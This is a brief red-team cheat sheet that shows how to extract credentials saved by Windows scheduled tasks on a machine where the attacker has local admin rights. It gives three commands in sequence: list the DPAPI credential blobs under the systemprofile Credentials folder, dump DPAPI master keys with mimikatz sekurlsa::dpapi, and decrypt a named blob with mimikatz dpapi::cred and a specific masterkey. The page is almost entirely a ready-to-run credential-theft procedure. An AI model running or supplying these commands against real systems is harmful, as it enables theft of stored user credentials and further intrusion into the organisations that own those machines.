# Extracting Secrets from scheduled tasks

## Extracting Secrets from scheduled tasks [t-ad-credential_access-scheduled_tasks_credentials]

Scheduled Tasks can save credentials so that they can run under the context of a user without them having to be logged on.  If we have local admin privileges on a machine, we can decrypt them in much the same way.  The blobs are saved under C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\

### 1.1 List secrets



{% code overflow="wrap" %}
```bash
dir C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

```
{% endcode %}

### 1.2 Extract the AES128/256 encryption key



{% code overflow="wrap" %}
```bash
#locally
mimikatz !sekurlsa::dpapi

```
{% endcode %}

### 1.3 Decrypt the blobs



{% code overflow="wrap" %}
```bash
mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9

```
{% endcode %}

